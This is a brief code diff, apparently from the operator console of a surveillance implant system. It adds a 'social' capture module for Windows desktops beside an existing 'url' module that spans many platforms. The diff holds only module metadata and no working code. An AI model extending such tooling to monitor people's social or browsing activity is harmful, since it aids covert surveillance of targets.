@@ -171,6 +171,12 @@ package it.ht.rcs.console
         },
         
         {
+          module: "social",
+          _type: "desktop",
+          _platform: "windows"
+        },
+        
+        {
           module: "url",
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
